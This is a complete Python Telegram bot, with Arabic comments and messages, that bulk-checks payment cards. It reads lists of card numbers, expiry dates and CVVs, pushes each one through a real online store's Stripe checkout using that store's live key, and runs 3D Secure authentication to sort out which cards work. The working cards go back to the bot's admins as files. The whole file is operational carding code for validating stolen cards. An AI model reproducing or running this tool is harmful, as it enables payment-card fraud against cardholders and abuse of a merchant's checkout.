import os
import asyncio
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
import requests
import json
import base64
import urllib.parse

# ========== الإعدادات ==========
BOT_TOKEN = "8166484030:AAHwrm95j131yJxvtlNTAe6S57f5kcfU1ow"
ADMIN_IDS = [5895491379, 844663875]

# ========== إحصائيات ==========
stats = {
    'total': 0,
    'checking': 0,
    'authenticated': 0,
    'challenge': 0,
    'attempted': 0,
    'not_auth': 0,
    'unavailable': 0,
    'declined': 0,
    'errors': 0,
    'start_time': None,
    'is_running': False,
    'dashboard_message_id': None,
    'chat_id': None,
    'current_card': '',
    'last_response': 'Waiting...',
    'cards_checked': 0,
    'authenticated_cards': [],
    'challenge_cards': [],
    'attempted_cards': [],
}

# ========== Stripe Checker Class ==========
class StripeChecker:
    def __init__(self):
        self.session = requests.Session()
        self.headers = {
            'accept': 'application/json',
            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
        }
        
    def check(self, card_number, exp_month, exp_year, cvv):
        try:
            # الخطوة 1: إنشاء Payment Method
            headers = self.headers.copy()
            headers.update({
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
            })
            
            data = (
                f'billing_details[address][state]=NY&'
                f'billing_details[address][postal_code]=10003&'
                f'billing_details[address][country]=UA&'
                f'billing_details[address][city]=Napoleon&'
                f'billing_details[address][line1]=111+North+Street&'
                f'billing_details[email]=test36222@gmail.com&'
                f'billing_details[name]=Card+Test&'
                f'billing_details[phone]=3609998856&'
                f'type=card&'
                f'card[number]={card_number.replace(" ", "")}&'
                f'card[cvc]={cvv}&'
                f'card[exp_year]={exp_year}&'
                f'card[exp_month]={exp_month}&'
                f'allow_redisplay=unspecified&'
                f'pasted_fields=number&'
                f'payment_user_agent=stripe.js%2F846ec90400&'
                f'referrer=https%3A%2F%2Fwww.ironmongeryworld.com&'
                f'time_on_page=65184&'
                f'guid=NA&'
                f'muid=NA&'
                f'sid=NA&'
                f'key=pk_live_51LDoVIEhD5wOrE4kVVnYNDdcbJ5XmtIHmRk6Pi8iM30zWAPeSU48iqDfow9JWV9hnFBoht7zZsSewIGshXiSw2ik00qD5ErF6X&'
                f'_stripe_version=2020-03-02'
            )
            
            r = self.session.post(
                'https://api.stripe.com/v1/payment_methods',
                headers=headers,
                data=data,
                timeout=30
            )
            
            if r.status_code != 200:
                return 'ERROR', f'PM creation failed: {r.status_code}'
            
            pm = r.json()
            if 'id' not in pm:
                error_msg = pm.get('error', {}).get('message', 'Unknown error')
                return 'DECLINED', f'PM Error: {error_msg}'
            
            pm_id = pm['id']
            
            # الخطوة 2: إنشاء Payment Intent
            headers = self.headers.copy()
            headers.update({
                'content-type': 'application/json',
                'origin': 'https://www.ironmongeryworld.com',
                'referer': 'https://www.ironmongeryworld.com/onestepcheckout/',
                'x-requested-with': 'XMLHttpRequest',
            })
            
            # استخدام cart ID ديناميكي (يمكن تحديثه)
            cart_id = 'Sq7ijc1vhdeZQlCmuWQK3yD8CHIVVgP9'
            
            payload = {
                'cartId': cart_id,
                'billingAddress': {
                    'countryId': 'EG',
                    'region': 'NY',
                    'street': ['111 North Street'],
                    'company': '',
                    'telephone': '3609998856',
                    'postcode': '10003',
                    'city': 'Napoleon',
                    'firstname': 'Card',
                    'lastname': 'Test',
                    'extension_attributes': {},
                    'saveInAddressBook': None,
                },
                'paymentMethod': {
                    'method': 'stripe_payments',
                    'additional_data': {'payment_method': pm_id},
                    'extension_attributes': {'agreement_ids': []},
                },
                'email': 'test36222@gmail.com',
            }
            
            r = self.session.post(
                f'https://www.ironmongeryworld.com/rest/default/V1/guest-carts/{cart_id}/payment-information',
                headers=headers,
                json=payload,
                timeout=30
            )
            
            if r.status_code != 200:
                return 'ERROR', f'PI creation failed: {r.status_code}'
            
            res = r.json()
            if 'message' not in res:
                return 'DECLINED', 'No payment intent created'
            
            message = res['message']
            if 'pi_' not in message:
                return 'DECLINED', message
            
            # استخراج client_secret
            if ': ' in message:
                client_secret = message.split(': ')[1]
            else:
                client_secret = message
            
            pi_id = client_secret.split('_secret_')[0]
            
            # الخطوة 3: الحصول على Payment Intent
            headers = self.headers.copy()
            headers.update({
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
            })
            
            params = {
                'is_stripe_sdk': 'false',
                'client_secret': client_secret,
                'key': 'pk_live_51LDoVIEhD5wOrE4kVVnYNDdcbJ5XmtIHmRk6Pi8iM30zWAPeSU48iqDfow9JWV9hnFBoht7zZsSewIGshXiSw2ik00qD5ErF6X',
                '_stripe_version': '2020-03-02',
            }
            
            r = self.session.get(
                f'https://api.stripe.com/v1/payment_intents/{pi_id}',
                params=params,
                headers=headers,
                timeout=30
            )
            
            if r.status_code != 200:
                return 'ERROR', f'PI fetch failed: {r.status_code}'
            
            pi = r.json()
            
            # التحقق من الحالة
            if 'next_action' not in pi:
                status = pi.get('status', 'unknown')
                if status == 'succeeded':
                    return 'Y', 'Payment succeeded'
                return 'DECLINED', f'Status: {status}'
            
            # الخطوة 4: 3DS2 Authentication
            next_action = pi['next_action']
            if 'use_stripe_sdk' not in next_action:
                return 'ERROR', 'No 3DS data'
            
            sdk_data = next_action['use_stripe_sdk']
            source = sdk_data.get('three_d_secure_2_source', '')
            trans_id = sdk_data.get('server_transaction_id', '')
            
            if not source or not trans_id:
                return 'ERROR', 'Missing 3DS parameters'
            
            # إنشاء fingerprint data
            fp_data = {"threeDSServerTransID": trans_id}
            fp = base64.b64encode(json.dumps(fp_data).encode()).decode()
            
            browser_data = {
                "fingerprintAttempted": True,
                "fingerprintData": fp,
                "challengeWindowSize": None,
                "threeDSCompInd": "Y",
                "browserJavaEnabled": False,
                "browserJavascriptEnabled": True,
                "browserLanguage": "ar",
                "browserColorDepth": "24",
                "browserScreenHeight": "786",
                "browserScreenWidth": "1397",
                "browserTZ": "-120",
                "browserUserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            }
            
            browser_encoded = urllib.parse.quote(json.dumps(browser_data))
            
            data = (
                f'source={source}&'
                f'browser={browser_encoded}&'
                f'one_click_authn_device_support[hosted]=false&'
                f'one_click_authn_device_support[same_origin_frame]=false&'
                f'one_click_authn_device_support[spc_eligible]=true&'
                f'one_click_authn_device_support[webauthn_eligible]=true&'
                f'one_click_authn_device_support[publickey_credentials_get_allowed]=true&'
                f'key=pk_live_51LDoVIEhD5wOrE4kVVnYNDdcbJ5XmtIHmRk6Pi8iM30zWAPeSU48iqDfow9JWV9hnFBoht7zZsSewIGshXiSw2ik00qD5ErF6X&'
                f'_stripe_version=2020-03-02'
            )
            
            headers = self.headers.copy()
            headers.update({
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
            })
            
            r = self.session.post(
                'https://api.stripe.com/v1/3ds2/authenticate',
                headers=headers,
                data=data,
                timeout=30
            )
            
            if r.status_code != 200:
                return 'ERROR', f'3DS auth failed: {r.status_code}'
            
            auth = r.json()
            
            # تحليل النتيجة
            if 'ares' in auth:
                trans_status = auth['ares'].get('transStatus', 'UNKNOWN')
                
                status_map = {
                    'Y': ('Y', 'Authenticated - Full 3DS verification'),
                    'C': ('C', 'Challenge Required - Additional verification needed'),
                    'A': ('A', 'Attempted - Issuer attempted authentication'),
                    'N': ('N', 'Not Authenticated - Failed verification'),
                    'U': ('U', 'Unavailable - Technical issue'),
                    'R': ('DECLINED', 'Rejected by issuer'),
                }
                
                return status_map.get(trans_status, ('ERROR', f'Unknown status: {trans_status}'))
            
            if 'error' in auth:
                error_msg = auth['error'].get('message', 'Unknown error')
                return 'ERROR', f'3DS Error: {error_msg}'
            
            state = auth.get('state', 'unknown')
            if state == 'failed':
                return 'DECLINED', '3DS authentication failed'
            
            return 'ERROR', f'Unexpected response: {state}'
            
        except requests.exceptions.Timeout:
            return 'ERROR', 'Request timeout'
        except requests.exceptions.RequestException as e:
            return 'ERROR', f'Network error: {str(e)[:50]}'
        except Exception as e:
            return 'ERROR', f'Exception: {str(e)[:50]}'

async def send_result(bot_app, card, status_type, message):
    try:
        card_number = stats['authenticated'] + stats['challenge'] + stats['attempted']
        
        status_emojis = {
            'Y': ('✅', 'AUTHENTICATED CARD', 'Y - Authenticated'),
            'C': ('⚠️', 'CHALLENGE REQUIRED', 'C - Challenge Required'),
            'A': ('🔵', 'ATTEMPTED', 'A - Attempted'),
        }
        
        if status_type not in status_emojis:
            return
        
        emoji, title, status_text = status_emojis[status_type]
        
        text = (
            f"╔══════════════════════╗\n"
            f"{emoji} **{title}** {emoji}\n"
            f"╚══════════════════════╝\n\n"
            f"💳 `{card}`\n"
            f"🔥 Status: **{status_text}**\n"
            f"📊 Card #{card_number}\n"
            f"⚡️ Stripe 3DS Gateway\n"
            f"📝 {message}\n"
            f"╚══════════════════════╝"
        )
        
        if status_type == 'Y':
            stats['authenticated_cards'].append(card)
        elif status_type == 'C':
            stats['challenge_cards'].append(card)
        elif status_type == 'A':
            stats['attempted_cards'].append(card)
        
        await bot_app.bot.send_message(
            chat_id=stats['chat_id'],
            text=text,
            parse_mode='Markdown'
        )
    except Exception as e:
        print(f"[!] Error sending result: {e}")

async def check_card(card, bot_app):
    if not stats['is_running']:
        return card, "STOPPED", "تم الإيقاف"
    
    parts = card.strip().split('|')
    if len(parts) != 4:
        stats['errors'] += 1
        stats['checking'] -= 1
        stats['last_response'] = 'Format Error'
        await update_dashboard(bot_app)
        return card, "ERROR", "صيغة خاطئة"
    
    card_number, exp_month, exp_year, cvv = [p.strip() for p in parts]
    
    # تنظيف البيانات
    card_number = card_number.replace(' ', '').replace('-', '')
    exp_month = exp_month.zfill(2)
    
    if len(exp_year) == 4:
        exp_year = exp_year[-2:]
    
    try:
        if not stats['is_running']:
            stats['checking'] -= 1
            return card, "STOPPED", "تم الإيقاف"
        
        checker = StripeChecker()
        status, message = checker.check(card_number, exp_month, exp_year, cvv)
        
        status_handlers = {
            'Y': ('authenticated', 'Authenticated ✅'),
            'C': ('challenge', 'Challenge ⚠️'),
            'A': ('attempted', 'Attempted 🔵'),
            'N': ('not_auth', 'Not Auth ❌'),
            'U': ('unavailable', 'Unavailable 🔴'),
            'DECLINED': ('declined', 'Declined ❌'),
        }
        
        if status in status_handlers:
            stat_key, response_text = status_handlers[status]
            stats[stat_key] += 1
            stats['checking'] -= 1
            stats['last_response'] = response_text
            await update_dashboard(bot_app)
            
            if status in ['Y', 'C', 'A']:
                await send_result(bot_app, card, status, message)
            
            return card, status, message
        else:
            stats['errors'] += 1
            stats['checking'] -= 1
            stats['last_response'] = f'{status[:20]}'
            await update_dashboard(bot_app)
            return card, status, message
            
    except Exception as e:
        stats['errors'] += 1
        stats['checking'] -= 1
        stats['last_response'] = f'Error: {str(e)[:20]}'
        await update_dashboard(bot_app)
        return card, "EXCEPTION", str(e)

def create_dashboard_keyboard():
    elapsed = 0
    if stats['start_time']:
        elapsed = int((datetime.now() - stats['start_time']).total_seconds())
    mins, secs = divmod(elapsed, 60)
    hours, mins = divmod(mins, 60)
    
    keyboard = [
        [InlineKeyboardButton(f"🔥 الإجمالي: {stats['total']}", callback_data="total")],
        [
            InlineKeyboardButton(f"🔄 يتم الفحص: {stats['checking']}", callback_data="checking"),
            InlineKeyboardButton(f"⏱ {hours:02d}:{mins:02d}:{secs:02d}", callback_data="time")
        ],
        [
            InlineKeyboardButton(f"✅ Y: {stats['authenticated']}", callback_data="authenticated"),
            InlineKeyboardButton(f"⚠️ C: {stats['challenge']}", callback_data="challenge")
        ],
        [
            InlineKeyboardButton(f"🔵 A: {stats['attempted']}", callback_data="attempted"),
            InlineKeyboardButton(f"❌ N: {stats['not_auth']}", callback_data="not_auth")
        ],
        [
            InlineKeyboardButton(f"🔴 U: {stats['unavailable']}", callback_data="unavailable"),
            InlineKeyboardButton(f"❌ Declined: {stats['declined']}", callback_data="declined")
        ],
        [InlineKeyboardButton(f"⚠️ Errors: {stats['errors']}", callback_data="errors")],
        [InlineKeyboardButton(f"📡 {stats['last_response']}", callback_data="response")]
    ]
    
    if stats['is_running']:
        keyboard.append([InlineKeyboardButton("🛑 إيقاف الفحص", callback_data="stop_check")])
    
    if stats['current_card']:
        keyboard.append([InlineKeyboardButton(f"🔄 {stats['current_card']}", callback_data="current")])
    
    return InlineKeyboardMarkup(keyboard)

async def update_dashboard(bot_app):
    if stats['dashboard_message_id'] and stats['chat_id']:
        try:
            await bot_app.bot.edit_message_text(
                chat_id=stats['chat_id'],
                message_id=stats['dashboard_message_id'],
                text="📊 **STRIPE 3DS CHECKER - LIVE** 📊",
                reply_markup=create_dashboard_keyboard(),
                parse_mode='Markdown'
            )
        except Exception as e:
            pass

async def send_final_files(bot_app):
    try:
        file_configs = [
            ('authenticated_cards', '✅', 'Authenticated Cards (Y)'),
            ('challenge_cards', '⚠️', 'Challenge Required Cards (C)'),
            ('attempted_cards', '🔵', 'Attempted Cards (A)'),
        ]
        
        for card_type, emoji, caption in file_configs:
            cards = stats.get(f'{card_type}', [])
            if cards:
                filename = f"{card_type}.txt"
                with open(filename, "w", encoding='utf-8') as f:
                    f.write("\n".join(cards))
                
                with open(filename, "rb") as f:
                    await bot_app.bot.send_document(
                        chat_id=stats['chat_id'],
                        document=f,
                        caption=f"{emoji} **{caption}** ({len(cards)} cards)",
                        parse_mode='Markdown'
                    )
                
                os.remove(filename)
        
    except Exception as e:
        print(f"[!] خطأ في إرسال الملفات: {e}")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ غير مصرح - هذا البوت خاص")
        return
    
    keyboard = [[InlineKeyboardButton("📝 إرسال ملف البطاقات", callback_data="send_file")]]
    await update.message.reply_text(
        "📊 **STRIPE 3DS CHECKER BOT**\n\n"
        "أرسل ملف .txt يحتوي على البطاقات\n"
        "الصيغة: `رقم|شهر|سنة|cvv`\n\n"
        "**الردود المتاحة:**\n"
        "✅ Y - Authenticated\n"
        "⚠️ C - Challenge Required\n"
        "🔵 A - Attempted\n"
        "❌ N - Not Authenticated\n"
        "🔴 U - Unavailable\n"
        "❌ Declined/Rejected (R)",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ غير مصرح")
        return
    
    if stats['is_running']:
        await update.message.reply_text("⚠️ يوجد فحص جاري!")
        return
    
    file = await update.message.document.get_file()
    file_content = await file.download_as_bytearray()
    cards = [c.strip() for c in file_content.decode('utf-8').strip().split('\n') if c.strip()]
    
    stats.update({
        'total': len(cards),
        'checking': 0,
        'authenticated': 0,
        'challenge': 0,
        'attempted': 0,
        'not_auth': 0,
        'unavailable': 0,
        'declined': 0,
        'errors': 0,
        'current_card': '',
        'last_response': 'Starting...',
        'cards_checked': 0,
        'authenticated_cards': [],
        'challenge_cards': [],
        'attempted_cards': [],
        'start_time': datetime.now(),
        'is_running': True,
        'chat_id': update.effective_chat.id
    })
    
    dashboard_msg = await update.message.reply_text(
        text="📊 **STRIPE 3DS CHECKER - LIVE** 📊",
        reply_markup=create_dashboard_keyboard(),
        parse_mode='Markdown'
    )
    stats['dashboard_message_id'] = dashboard_msg.message_id
    
    await update.message.reply_text(
        f"✅ تم بدء الفحص!\n\n"
        f"📊 إجمالي البطاقات: {len(cards)}\n"
        f"🔄 جاري الفحص...",
        parse_mode='Markdown'
    )
    
    asyncio.create_task(process_cards(cards, context.application))

async def process_cards(cards, bot_app):
    for i, card in enumerate(cards):
        if not stats['is_running']:
            stats['last_response'] = 'Stopped by user 🛑'
            await update_dashboard(bot_app)
            break
        
        stats['checking'] = 1
        parts = card.split('|')
        stats['current_card'] = f"{parts[0][:6]}****{parts[0][-4:]}" if len(parts) > 0 else card[:10]
        await update_dashboard(bot_app)
        
        await check_card(card, bot_app)
        stats['cards_checked'] += 1
        
        if stats['cards_checked'] % 3 == 0:
            await update_dashboard(bot_app)
        
        await asyncio.sleep(3)
    
    stats['is_running'] = False
    stats['checking'] = 0
    stats['current_card'] = ''
    stats['last_response'] = 'Completed ✅'
    await update_dashboard(bot_app)
    
    summary_text = (
        "╔═══════════════════╗\n"
        "✅ **اكتمل الفحص!** ✅\n"
        "╚═══════════════════╝\n\n"
        f"📊 **الإحصائيات النهائية:**\n"
        f"🔥 الإجمالي: {stats['total']}\n"
        f"✅ Authenticated (Y): {stats['authenticated']}\n"
        f"⚠️ Challenge (C): {stats['challenge']}\n"
        f"🔵 Attempted (A): {stats['attempted']}\n"
        f"❌ Not Auth (N): {stats['not_auth']}\n"
        f"🔴 Unavailable (U): {stats['unavailable']}\n"
        f"❌ Declined/Rejected: {stats['declined']}\n"
        f"⚠️ Errors: {stats['errors']}\n\n"
        "📁 **جاري إرسال الملفات...**"
    )
    
    await bot_app.bot.send_message(
        chat_id=stats['chat_id'],
        text=summary_text,
        parse_mode='Markdown'
    )
    
    await send_final_files(bot_app)
    
    final_text = (
        "╔═══════════════════════╗\n"
        "🎉 **تم إنهاء العملية بنجاح!** 🎉\n"
        "╚═══════════════════════╝\n\n"
        "✅ تم إرسال جميع الملفات\n"
        "📊 شكراً لاستخدامك البوت!\n\n"
        "⚡️ Stripe 3DS Gateway"
    )
    
    await bot_app.bot.send_message(
        chat_id=stats['chat_id'],
        text=final_text,
        parse_mode='Markdown'
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ غير مصرح - هذا البوت خاص")
        return

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    
    if query.from_user.id not in ADMIN_IDS:
        await query.answer("❌ غير مصرح", show_alert=True)
        return
    
    try:
        await query.answer()
    except:
        pass
    
    if query.data == "stop_check":
        if stats['is_running']:
            stats['is_running'] = False
            stats['checking'] = 0
            stats['last_response'] = 'Stopped 🛑'
            await update_dashboard(context.application)
            try:
                await context.application.bot.send_message(
                    chat_id=stats['chat_id'],
                    text="🛑 **تم إيقاف الفحص بواسطة المستخدم!**",
                    parse_mode='Markdown'
                )
            except:
                pass

def main():
    print("[🤖] Starting Stripe 3DS Telegram Bot...")
    print("[✅] Updated version with improved error handling")
    print("[✅] Using asyncio.create_task")
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.add_handler(CallbackQueryHandler(button_callback))
    
    print("[✅] Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
